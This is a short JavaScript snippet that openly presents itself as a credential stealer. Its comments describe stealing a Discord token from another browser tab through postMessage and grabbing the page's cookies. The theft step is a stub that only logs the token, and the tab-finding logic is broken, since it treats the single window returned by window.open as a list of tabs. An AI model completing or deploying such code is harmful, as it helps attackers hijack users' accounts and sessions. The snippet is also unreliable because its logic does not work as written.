// Define the function to steal data and token
function stealDataAndToken() {
    // Function to send a message to the other tab
    function sendMessageToOtherTab(message) {
        // Find the other tab
        var otherTab = null;
        var targetOrigin = '*'; // Change this to the origin of the other tab if known

        // Loop through all open windows (tabs)
        var windows = window.open('', '_blank');
        for (var i = 0; i < windows.length; i++) {
            var win = windows[i];
            if (win !== window) {
                otherTab = win;
                break;
            }
        }

        // Send message to the other tab using postMessage
        if (otherTab) {
            otherTab.postMessage({ type: 'getDiscordToken' }, targetOrigin);
        } else {
            console.error('Unable to find the other tab.');
        }
    }

    // Listen for messages from the other tab
    window.addEventListener('message', function(event) {
        // Verify that the message is from a trusted origin
        if (event.origin !== window.origin) {
            console.error('Received message from untrusted origin:', event.origin);
            return;
        }

        // Check if the message is a request for the Discord token
        if (event.data.type === 'sendDiscordToken') {
            // Retrieve the Discord token from the message data
            var discordToken = event.data.token;

            // Check if the token is null
            if (discordToken !== null) {
                // Proceed with stealing data using the retrieved token
                stealDataAndTokenWithToken(discordToken);
            } else {
                console.error('Received null Discord token from other tab.');
            }
        }
    });

    // Call the function to send a message to the other tab requesting the Discord token
    sendMessageToOtherTab('Please send Discord token');
}

// Function to steal data and token using the Discord token retrieved from another tab
function stealDataAndTokenWithToken(discordToken) {
    // Capture cookies from document.cookie
    var allCookies = document.cookie;

    // Proceed with stealing data using the retrieved Discord token
    // Here, you can include the original stealDataAndToken logic

    console.log('Discord Token:', discordToken);
}

// Call the function to steal data and token
stealDataAndToken();
